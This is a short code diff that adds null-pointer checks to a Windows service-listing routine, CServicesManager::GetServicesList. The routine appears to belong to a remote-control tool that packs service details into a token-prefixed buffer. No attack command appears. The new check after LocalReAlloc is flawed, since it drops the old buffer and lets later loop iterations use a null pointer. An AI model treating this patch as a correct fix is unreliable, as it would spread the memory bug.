@@ -65,7 +65,8 @@ LPBYTE CServicesManager::GetServicesList()
 		&dwResumeHandle); 
 
 	szBuffer = (LPBYTE)LocalAlloc(LPTR, MAX_PATH);
-
+	if (szBuffer == NULL)
+		return NULL;
 	szBuffer[0] = TOKEN_SERVERLIST;
 	dwOffset = 1;
 	for (unsigned long i = 0; i < dwServicesCount; ++i)  // Display The Services,显示所有的服务
@@ -82,7 +83,8 @@ LPBYTE CServicesManager::GetServicesList()
 		}
 
 		ServicesInfor = (LPQUERY_SERVICE_CONFIG)LocalAlloc(LPTR,4*1024);        
-
+		if (ServicesInfor == NULL)
+			continue;
 		QueryServiceConfig(hServices,ServicesInfor,4*1024,&dwResumeHandle); 
 		//查询服务的启动类别
 
@@ -120,7 +122,8 @@ LPBYTE CServicesManager::GetServicesList()
 		if (LocalSize(szBuffer) < (dwOffset + dwLength))
 			szBuffer = (LPBYTE)LocalReAlloc(szBuffer, (dwOffset + dwLength),
 			LMEM_ZEROINIT|LMEM_MOVEABLE);
-
+		if (szBuffer == NULL)
+			continue;
 		memcpy(szBuffer + dwOffset, ServicesStatus[i].lpDisplayName, 
 			lstrlen(ServicesStatus[i].lpDisplayName) + 1);
 		dwOffset += lstrlen(ServicesStatus[i].lpDisplayName) + 1;//真实名称
